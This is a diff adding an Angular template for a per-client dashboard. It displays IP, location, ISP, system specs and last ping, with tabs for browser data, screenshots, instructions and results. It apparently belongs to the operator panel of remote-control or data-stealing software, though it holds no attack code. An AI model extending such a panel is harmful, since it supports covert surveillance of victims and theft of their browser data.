@@ -1,0 +1,87 @@
+<div *ngIf="ErrorMessage!=''">
+  {{ErrorMessage}}
+</div>
+<div *ngIf="client != null" class="content">
+  
+  <div id="info">
+    <div *ngIf="client.customName">{{ client.customName }}</div>
+    <div id="TopSection"><span>{{ ClientId }}</span><button (click)="UpdateRequest()">Request Update</button>
+    </div>
+    <div class="gridStyle">
+      <div>Name: {{ client.name }}</div>
+      <div>Created: {{ client.created | date:'short' }}</div>
+      <div>IP Address: {{ client.ipAddress }}</div>
+      <div>Location: {{ client.location?.city }} , {{ client.location?.country }}</div>
+      <div>ISP: {{ client.location?.isp }}</div>
+      <div>Version: {{ client.version }}</div>
+      <div>Latest update: {{ client.latestUpdate | date:'short' }}</div>
+      <div>Latest ping: {{ client.latestPing | date:'short' }}</div>
+  </div>
+    <div id="SysSpecs">
+      <div>System Specs</div>
+      <textarea readonly>{{ client.systemSpecs }}</textarea>
+    </div>
+  </div>
+  <div class="miniMenu">
+    <div class="left">
+      <a 
+      (click)="NavigateTo('browser')"
+      [class.selected]="currentPage==='browser'"
+      >
+        Browser Data
+      </a>
+      <a 
+      (click)="NavigateTo('screenshot')"
+      [class.selected]="currentPage==='screenshot'"
+      >
+        Screenshots
+      </a>
+      <a 
+      (click)="NavigateTo('instruction')"
+      [class.selected]="currentPage==='instruction'"
+      >
+        Instructions
+      </a>
+      <a 
+      (click)="NavigateTo('result')"
+      [class.selected]="currentPage==='result'">
+        Results
+      </a>
+    </div>
+    <div class="right">
+      <a (click)="Settings()">
+        ⚙️
+        Settings
+      </a>
+    </div>
+  </div>
+  <div *ngIf="isModalOpen" class="modal" (click)="onBackgroundClick($event)">
+    <div class="modal-content">
+      <span class="close" (click)="Settings()">&times;</span>
+      <div class="updateInput">
+        <label for="duration" >Check Duration :</label> 
+        <input type="number" id="duration" [(ngModel)]="client.checkDuration"> 
+      </div>
+      <div class="updateInput">
+        <label for="duration" >Custom Name :</label> 
+        <input type="text" id="name" [(ngModel)]="client.customName"> 
+      </div>
+      <div class="updateBtn" (click)="UpdateDuration()">Update</div>
+    </div>
+  </div>
+  <div style="width: 1200px;">
+    <div *ngIf="currentPage==='browser'">
+      <app-browser></app-browser>
+    </div>
+    <div *ngIf="currentPage==='screenshot'">
+      <app-screenshots></app-screenshots>
+    </div>
+    <div *ngIf="currentPage==='instruction'">
+      <app-instructions></app-instructions>
+    </div>
+    <div *ngIf="currentPage==='result'">
+      <app-results></app-results>
+    </div>
+  </div>
+    
+</div>
